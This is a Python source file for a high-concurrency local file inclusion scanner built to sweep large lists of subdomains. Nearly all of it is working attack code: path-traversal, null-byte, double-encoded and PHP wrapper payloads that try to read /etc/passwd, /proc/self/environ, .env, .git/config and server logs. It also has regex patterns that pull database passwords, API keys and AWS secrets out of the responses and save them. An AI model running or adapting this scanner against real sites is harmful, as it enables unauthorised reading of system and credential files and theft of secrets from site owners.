#!/usr/bin/env python3
"""
High-Performance LFI (Local File Inclusion) Scanner
Optimized for large subdomain lists
Author: LFI Scanner
"""

import asyncio
import aiohttp
import re
import sys
import os
from urllib.parse import urljoin, quote
from datetime import datetime
from typing import List, Dict, Any, Optional
import json
import argparse
from concurrent.futures import ThreadPoolExecutor

class LFIScanner:
    def __init__(self, input_file: str, output_file: str = "lfi_results.txt", 
                 max_workers: int = 100, timeout: int = 10):
        self.input_file = input_file
        self.output_file = output_file
        self.max_workers = max_workers
        self.timeout = timeout
        self.session = None
        
        # LFI payloads - optimized for speed and effectiveness
        self.lfi_payloads = [
            # Basic LFI
            "/etc/passwd",
            "/etc/hosts",
            "/etc/issue",
            "/proc/self/environ",
            "/proc/version",
            "/proc/cmdline",
            
            # Windows files
            "/windows/win.ini",
            "/windows/system32/drivers/etc/hosts",
            
            # Configuration files
            "/etc/apache2/apache2.conf",
            "/etc/nginx/nginx.conf",
            "/etc/httpd/conf/httpd.conf",
            "/.htaccess",
            "/web.config",
            
            # Log files
            "/var/log/apache2/access.log",
            "/var/log/apache/access.log",
            "/var/log/httpd/access_log",
            "/var/log/nginx/access.log",
            "/var/log/auth.log",
            "/proc/self/fd/0",
            
            # Source code disclosure
            "/index.php",
            "/index.php.bak",
            "/index.php~",
            "/config.php",
            "/config.php.bak",
            "/.env",
            "/.git/config",
            
            # Wrapper payloads
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/convert.base64-encode/resource=/etc/passwd",
            "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==",
            
            # Null byte injection
            "/etc/passwd%00",
            "/etc/passwd\x00",
            
            # Path traversal
            "../../../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
            
            # Encoded payloads
            "%2Fetc%2Fpasswd",
            "..%252F..%252F..%252F..%252Fetc%252Fpasswd",
            
            # Double encoding
            "%252e%252e%252fetc%252fpasswd",
            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        ]
        
        # File indicators - patterns to detect in response
        self.file_indicators = {
            'passwd': [
                r'root:x:0:0:',
                r'daemon:x:1:1:',
                r'bin:x:2:2:',
                r'sys:x:3:3:',
                r'nobody:x:65534:65534:',
                r'\/bin\/bash',
                r'\/bin\/false',
                r'\/sbin\/nologin'
            ],
            'php': [
                r'<\?php',
                r'phpinfo\(\)',
                r'PD9waHA=',  # base64 of <?php
                r'echo.*\$'
            ],
            'config': [
                r'define\(',
                r'DB_HOST',
                r'DB_NAME',
                r'DB_USER',
                r'DB_PASSWORD',
                r'SECRET_KEY',
                r'API_KEY'
            ],
            'log': [
                r'GET \/',
                r'POST \/',
                r'HTTP\/1\.[01]',
                r'\[error\]',
                r'\[warn\]',
                r'\[notice\]',
                r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'
            ],
            'env': [
                r'APP_ENV=',
                r'DB_',
                r'REDIS_',
                r'AWS_',
                r'API_',
                r'SECRET_',
                r'KEY='
            ],
            'windows': [
                r'\[fonts\]',
                r'\[extensions\]',
                r'\[files\]',
                r'\[Mail\]',
                r'\[MCI Extensions\]'
            ],
            'general': [
                r'Permission denied',
                r'No such file or directory',
                r'failed to open stream',
                r'Warning:.*include',
                r'Warning:.*fopen',
                r'Warning:.*file_get_contents',
                r'Warning:.*readfile'
            ]
        }
        
        # Common LFI parameters to test
        self.lfi_parameters = [
            'file', 'page', 'path', 'doc', 'document', 'folder',
            'root', 'path', 'style', 'pdf', 'template', 'pg',
            'load', 'filename', 'inc', 'locate', 'show', 'dir',
            'view', 'layout', 'mod', 'conf', 'url', 'display',
            'read', 'req', 'img', 'name', 'cat', 'action', 'board',
            'date', 'detail', 'download', 'prefix', 'include',
            'incfile', 'lang', 'content', 'document_root',
            'main', 'nav', 'option', 'pre', 'section', 'theme',
            'type', 'open', 'target', 'window', 'newsid', 'str',
            'text', 'from', 'redirect', 'site', 'html', 'title',
            'image', 'class', 'func', 'directory', 'v', 'q',
            's', 'search', 'category', 'msg', 'item', 'return',
            'filename', 'log', 'mode', 'p', 'f', 'm', 'module',
            'operation', 'base', 'home', 'site', 'name', 'course',
            'filepath', 'story', 'dest', 'cont', 'select', 'source',
            'file_name', 'load_file', 'pagefile', 'file_path',
            'include_path', 'include_file', 'tpl', 'php_path',
            'docroot', 'pathway', 'element', 'call', 'body', 'data',
            'reference', 'area', 'default', 'server', 'navigation',
            'header', 'footer', 'region', 'block', 'component',
            'widget', 'plugin', 'extension', 'attachment', 'asset',
            'resource', 'payload', 'input', 'output', 'result',
            'response', 'request', 'uri', 'urlpath', 'location',
            'destfile', 'srcfile', 'includefile', 'readfile',
            'showfile', 'viewfile', 'openfile', 'loadfile',
            'getfile', 'postfile', 'putfile', 'deletefile'
        ]
        
        # LFI patterns in URLs
        self.lfi_patterns = [
            r'file=(.*?)&',
            r'page=(.*?)&',
            r'path=(.*?)&',
            r'doc=(.*?)&',
            r'document=(.*?)&',
            r'folder=(.*?)&',
            r'root=(.*?)&',
            r'include=(.*?)&',
            r'load=(.*?)&',
            r'inc=(.*?)&',
            r'view=(.*?)&',
            r'locate=(.*?)&',
            r'show=(.*?)&',
            r'open=(.*?)&',
            r'read=(.*?)&'
        ]

    async def init_session(self):
        """Initialize async HTTP session"""
        timeout = aiohttp.ClientTimeout(total=self.timeout)
        connector = aiohttp.TCPConnector(limit=self.max_workers, ssl=False)
        self.session = aiohttp.ClientSession(timeout=timeout, connector=connector)

    async def close_session(self):
        """Close async HTTP session"""
        if self.session:
            await self.session.close()

    def load_subdomains(self) -> List[str]:
        """Load subdomains from input file"""
        try:
            with open(self.input_file, 'r') as f:
                subdomains = [line.strip() for line in f if line.strip()]
            print(f"[+] Loaded {len(subdomains)} subdomains from {self.input_file}")
            return subdomains
        except FileNotFoundError:
            print(f"[!] File {self.input_file} not found!")
            sys.exit(1)

    async def check_url_for_lfi(self, url: str, param: str, payload: str) -> Optional[Dict[str, Any]]:
        """Test a single URL for LFI vulnerability"""
        try:
            # Construct URL with payload
            test_url = f"{url}{param}={quote(payload)}"
            
            # Use HEAD first for speed, then GET if promising
            async with self.session.head(test_url, allow_redirects=True) as response:
                if response.status == 200:
                    # If HEAD returns 200, do a GET to check content
                    async with self.session.get(test_url, allow_redirects=True) as full_response:
                        text = await full_response.text()
                        
                        # Check for file indicators
                        file_type = self.detect_file_type(text, payload)
                        if file_type:
                            return {
                                'url': test_url,
                                'payload': payload,
                                'param': param,
                                'status': full_response.status,
                                'file_type': file_type,
                                'evidence': self.extract_evidence(text),
                                'length': len(text)
                            }
                elif response.status == 500:
                    # 500 error might indicate LFI attempt
                    async with self.session.get(test_url, allow_redirects=True) as full_response:
                        text = await full_response.text()
                        if any(pattern in text.lower() for pattern in ['warning', 'failed', 'permission', 'no such file']):
                            return {
                                'url': test_url,
                                'payload': payload,
                                'param': param,
                                'status': full_response.status,
                                'file_type': 'error',
                                'evidence': 'Server error response suggests LFI attempt',
                                'length': len(text)
                            }
        
        except Exception as e:
            pass
        
        return None

    def detect_file_type(self, text: str, payload: str) -> Optional[str]:
        """Detect if response contains file content"""
        if not text or len(text) > 100000:  # Skip very large responses
            return None
        
        text_lower = text.lower()
        
        # Skip common error pages
        error_indicators = ['404 not found', 'page not found', 'error 404', 'not found']
        if any(indicator in text_lower for indicator in error_indicators):
            return None
        
        # Check for specific file patterns
        for file_type, patterns in self.file_indicators.items():
            for pattern in patterns:
                if re.search(pattern, text, re.IGNORECASE):
                    return file_type
        
        # Check for file-like content
        lines = text.split('\n')
        if len(lines) > 3:
            # Look for file system paths
            if any('/etc/' in line or 'C:\\' in line or '/var/' in line for line in lines[:10]):
                return 'system'
            
            # Check for configuration patterns
            config_patterns = [r'\w+=\w+', r'\w+:\s*\w+', r'{\s*"\w+"']
            for line in lines[:10]:
                if any(re.search(pattern, line) for pattern in config_patterns):
                    return 'config'
        
        return None

    def extract_evidence(self, text: str, max_lines: int = 5) -> str:
        """Extract relevant evidence from response"""
        lines = text.split('\n')
        evidence_lines = []
        
        for line in lines[:max_lines * 2]:  # Check first few lines
            line_stripped = line.strip()
            if line_stripped:
                # Look for interesting content
                if any(keyword in line_stripped.lower() for keyword in 
                      ['root:', 'user:', 'password:', 'secret:', 'key:', 'api_', 'db_']):
                    evidence_lines.append(line_stripped[:200])  # Limit length
        
        if evidence_lines:
            return '\n'.join(evidence_lines[:max_lines])
        
        # Return first non-empty lines as evidence
        return '\n'.join([line[:100] for line in lines[:max_lines] if line.strip()])

    async def test_subdomain_for_lfi(self, subdomain: str) -> List[Dict[str, Any]]:
        """Test a subdomain for LFI vulnerabilities"""
        vulnerabilities = []
        
        # Test common URL patterns
        test_urls = [
            f"http://{subdomain}/",
            f"http://{subdomain}/index.php",
            f"http://{subdomain}/admin/index.php",
            f"http://{subdomain}/includes/header.php",
            f"http://{subdomain}/template.php",
            f"https://{subdomain}/",
            f"https://{subdomain}/index.php"
        ]
        
        for base_url in test_urls:
            try:
                # First, check if URL exists
                async with self.session.head(base_url, allow_redirects=True, timeout=5) as response:
                    if response.status not in [200, 301, 302]:
                        continue
                
                # Extract parameters from URL if any
                if '?' in base_url:
                    # Test with existing parameters
                    for param in self.lfi_parameters[:20]:  # Test first 20 parameters for speed
                        for payload in self.lfi_payloads[:10]:  # Test first 10 payloads
                            result = await self.check_url_for_lfi(base_url, param, payload)
                            if result:
                                vulnerabilities.append(result)
                                break  # Found vulnerability, move to next param
                else:
                    # Test with common parameter names
                    for param in self.lfi_parameters[:15]:  # Test first 15 parameters
                        test_url = f"{base_url}?{param}="
                        for payload in self.lfi_payloads[:8]:  # Test first 8 payloads
                            result = await self.check_url_for_lfi(test_url, '', payload)
                            if result:
                                result['param'] = param
                                vulnerabilities.append(result)
                                break  # Found vulnerability, move to next param
                
            except Exception as e:
                continue
        
        return vulnerabilities

    async def fast_scan_subdomain(self, subdomain: str) -> Optional[Dict[str, Any]]:
        """Fast scan optimized for large lists"""
        try:
            # Try HTTP first
            base_url = f"http://{subdomain}/"
            
            # Quick test with most common payload
            test_urls = [
                f"{base_url}?file=../../../../etc/passwd",
                f"{base_url}?page=../../../../etc/passwd",
                f"{base_url}?path=../../../../etc/passwd",
                f"{base_url}?include=../../../../etc/passwd"
            ]
            
            for test_url in test_urls:
                try:
                    async with self.session.get(test_url, timeout=5, allow_redirects=True) as response:
                        text = await response.text()
                        
                        # Quick check for /etc/passwd content
                        if 'root:x:0:0:' in text:
                            return {
                                'subdomain': subdomain,
                                'url': test_url,
                                'payload': '../../../../etc/passwd',
                                'status': response.status,
                                'file_type': 'passwd',
                                'evidence': self.extract_evidence(text),
                                'confidence': 'HIGH'
                            }
                        
                        # Check for LFI error messages
                        error_indicators = [
                            'failed to open stream',
                            'No such file or directory',
                            'Warning: include',
                            'Warning: fopen'
                        ]
                        
                        if any(error in text for error in error_indicators):
                            return {
                                'subdomain': subdomain,
                                'url': test_url,
                                'payload': '../../../../etc/passwd',
                                'status': response.status,
                                'file_type': 'error',
                                'evidence': 'LFI error pattern detected',
                                'confidence': 'MEDIUM'
                            }
                
                except Exception:
                    continue
            
            # Try HTTPS if HTTP failed
            base_url = f"https://{subdomain}/"
            test_urls = [
                f"{base_url}?file=../../../../etc/passwd",
                f"{base_url}?page=../../../../etc/passwd"
            ]
            
            for test_url in test_urls:
                try:
                    async with self.session.get(test_url, timeout=5, allow_redirects=True, ssl=False) as response:
                        text = await response.text()
                        
                        if 'root:x:0:0:' in text:
                            return {
                                'subdomain': subdomain,
                                'url': test_url,
                                'payload': '../../../../etc/passwd',
                                'status': response.status,
                                'file_type': 'passwd',
                                'evidence': self.extract_evidence(text),
                                'confidence': 'HIGH'
                            }
                except Exception:
                    continue
        
        except Exception:
            pass
        
        return None

    async def scan_all(self, subdomains: List[str], fast_mode: bool = True):
        """Scan all subdomains"""
        await self.init_session()
        
        print(f"[+] Starting LFI scan on {len(subdomains)} subdomains")
        print(f"[+] Mode: {'FAST' if fast_mode else 'COMPREHENSIVE'}")
        print(f"[+] Workers: {self.max_workers}")
        print(f"[+] Timeout: {self.timeout}s")
        
        vulnerabilities = []
        scanned = 0
        
        # Use semaphore to limit concurrent requests
        semaphore = asyncio.Semaphore(self.max_workers)
        
        async def scan_with_limit(subdomain):
            async with semaphore:
                if fast_mode:
                    result = await self.fast_scan_subdomain(subdomain)
                else:
                    results = await self.test_subdomain_for_lfi(subdomain)
                    result = results[0] if results else None
                
                nonlocal scanned
                scanned += 1
                
                if scanned % 100 == 0:
                    print(f"[+] Scanned {scanned}/{len(subdomains)} subdomains")
                
                return result
        
        # Create tasks
        tasks = [scan_with_limit(subdomain) for subdomain in subdomains]
        
        # Process in chunks to avoid memory issues
        chunk_size = 500
        for i in range(0, len(tasks), chunk_size):
            chunk = tasks[i:i + chunk_size]
            results = await asyncio.gather(*chunk, return_exceptions=True)
            
            for result in results:
                if isinstance(result, dict):
                    vulnerabilities.append(result)
            
            if vulnerabilities:
                print(f"[+] Found {len(vulnerabilities)} potential LFI vulnerabilities so far")
        
        await self.close_session()
        
        return vulnerabilities

    def save_results(self, vulnerabilities: List[Dict[str, Any]], output_format: str = "txt"):
        """Save scan results"""
        print(f"\n[+] Found {len(vulnerabilities)} potential LFI vulnerabilities")
        
        if not vulnerabilities:
            print("[!] No LFI vulnerabilities found")
            return
        
        # Sort by confidence
        vulnerabilities.sort(key=lambda x: 0 if x.get('confidence') == 'HIGH' else 1)
        
        # Save as text
        with open(self.output_file, 'w') as f:
            f.write("=" * 80 + "\n")
            f.write("LFI VULNERABILITY SCAN RESULTS\n")
            f.write("=" * 80 + "\n\n")
            f.write(f"Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Total Subdomains Scanned: Unknown (from file)\n")
            f.write(f"Vulnerabilities Found: {len(vulnerabilities)}\n")
            f.write("=" * 80 + "\n\n")
            
            for i, vuln in enumerate(vulnerabilities, 1):
                f.write(f"[{i}] {vuln['subdomain']}\n")
                f.write(f"    URL: {vuln['url']}\n")
                f.write(f"    Payload: {vuln['payload']}\n")
                f.write(f"    Status: {vuln['status']}\n")
                f.write(f"    File Type: {vuln['file_type']}\n")
                f.write(f"    Confidence: {vuln.get('confidence', 'UNKNOWN')}\n")
                if vuln.get('evidence'):
                    f.write(f"    Evidence:\n")
                    for line in vuln['evidence'].split('\n'):
                        f.write(f"      {line}\n")
                f.write("\n")
        
        print(f"[+] Results saved to {self.output_file}")
        
        # Also save as JSON for programmatic use
        json_file = self.output_file.replace('.txt', '.json')
        with open(json_file, 'w') as f:
            json.dump(vulnerabilities, f, indent=2)
        print(f"[+] JSON results saved to {json_file}")
        
        # Print summary
        print("\n" + "=" * 80)
        print("SCAN SUMMARY")
        print("=" * 80)
        print(f"High confidence findings: {sum(1 for v in vulnerabilities if v.get('confidence') == 'HIGH')}")
        print(f"Medium confidence findings: {sum(1 for v in vulnerabilities if v.get('confidence') == 'MEDIUM')}")
        
        if any(v.get('file_type') == 'passwd' for v in vulnerabilities):
            print("\n🚨 CRITICAL: /etc/passwd files found!")
            for vuln in vulnerabilities:
                if vuln.get('file_type') == 'passwd':
                    print(f"  • {vuln['subdomain']}")

async def main():
    parser = argparse.ArgumentParser(
        description="High-Performance LFI Scanner for Large Subdomain Lists",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -i all_subs.txt                    # Fast scan (recommended for large lists)
  %(prog)s -i all_subs.txt -o results.txt     # Custom output file
  %(prog)s -i all_subs.txt -w 200             # 200 concurrent workers
  %(prog)s -i all_subs.txt --full             # Full comprehensive scan (slower)
  %(prog)s -i all_subs.txt --limit 1000       # Limit to first 1000 subdomains
        
Note: For huge lists (>10k subdomains), use fast mode with high concurrency.
        """
    )
    
    parser.add_argument("-i", "--input", required=True,
                       help="Input file containing subdomains (one per line)")
    parser.add_argument("-o", "--output", default="lfi_results.txt",
                       help="Output results file (default: lfi_results.txt)")
    parser.add_argument("-w", "--workers", type=int, default=100,
                       help="Maximum concurrent workers (default: 100)")
    parser.add_argument("-t", "--timeout", type=int, default=10,
                       help="Request timeout in seconds (default: 10)")
    parser.add_argument("--full", action="store_true",
                       help="Perform full comprehensive scan (slower)")
    parser.add_argument("--limit", type=int,
                       help="Limit number of subdomains to scan")
    
    args = parser.parse_args()
    
    # Check input file
    if not os.path.exists(args.input):
        print(f"[!] Input file {args.input} not found!")
        sys.exit(1)
    
    scanner = LFIScanner(
        input_file=args.input,
        output_file=args.output,
        max_workers=args.workers,
        timeout=args.timeout
    )
    
    # Load subdomains
    subdomains = scanner.load_subdomains()
    
    if args.limit:
        subdomains = subdomains[:args.limit]
        print(f"[+] Limiting scan to {args.limit} subdomains")
    
    # Start scan
    start_time = datetime.now()
    
    vulnerabilities = await scanner.scan_all(subdomains, fast_mode=not args.full)
    
    # Save results
    scanner.save_results(vulnerabilities)
    
    elapsed = datetime.now() - start_time
    print(f"\n[+] Scan completed in {elapsed}")
    
    if vulnerabilities:
        print("\n✅ LFI vulnerabilities found! Check the output files for details.")
    else:
        print("\n❌ No LFI vulnerabilities found.")

if __name__ == "__main__":
    # Check for required packages
    try:
        import aiohttp
    except ImportError:
        print("[!] Required package not found: aiohttp")
        print("[!] Install with: pip install aiohttp")
        sys.exit(1)
    
    asyncio.run(main())
